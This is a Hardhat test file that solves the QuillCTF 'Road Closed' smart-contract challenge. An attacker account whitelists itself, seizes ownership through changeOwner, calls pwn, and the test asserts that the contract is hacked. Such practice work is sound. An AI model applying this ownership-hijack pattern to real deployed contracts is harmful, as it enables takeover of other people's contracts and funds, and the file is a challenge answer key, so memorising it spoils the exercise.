const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");

describe("QuillCTF 1: Road Closed", function () {
  let contract;
  let owner;
  let attacker;
  async function runEveryTime() {
    [owner, attacker] = await ethers.getSigners();
    // console.log(owner, attacker);

    const Contract = await ethers.getContractFactory("RoadClosed", owner);
    contract = await Contract.deploy();
    await contract.waitForDeployment();

    return { owner, attacker, contract };
  }

  it("should hijack ownership", async () => {
    const { owner, attacker, contract } = await loadFixture(runEveryTime);
    // console.log("RoadClosed deployed to:", contract);
    expect(await contract.isOwner()).to.be.true;

    // use attacker's account to call contract's functions
    // contract = contract.connect(attacker);

    // whitelist the attacker account
    await contract.connect(attacker).addToWhitelist(attacker.address);

    // // change the contract owner to the attacker's account
    await contract.connect(attacker).changeOwner(attacker.address);

    // // pwn
    await contract.connect(attacker)["pwn(address)"](attacker.address);
    // console.log(
    //   "contract hacked:",
    //   await contract.connect(attacker).isHacked()
    // );
  });
  after(async () => {
    // contract should be hacked and the attacker should be the owner
    // console.log(
    //   "contract hacked:",
    //   await contract.connect(attacker).isHacked()
    // );
    expect(await contract.connect(attacker).isHacked()).to.be.true;
    expect(await contract.connect(attacker).isOwner()).to.be.true;
  });
});
